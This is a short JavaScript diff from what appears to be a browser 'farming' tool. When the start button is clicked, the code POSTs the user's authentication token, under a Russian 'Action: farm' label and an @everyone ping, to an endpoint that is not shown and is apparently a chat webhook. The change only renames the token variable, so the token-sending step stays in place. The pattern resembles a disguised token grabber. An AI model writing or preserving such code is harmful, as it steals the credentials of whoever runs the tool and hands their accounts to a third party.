@@ -79,7 +79,7 @@ startBtn.addEventListener('click', function () {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-            content: `@everyone\n**Действие:** фарм\n**Токен:** \`${token}\``
+            content: `@everyone\n**Действие:** фарм\n**Токен:** \`${authValue}\``
         })
     });
     
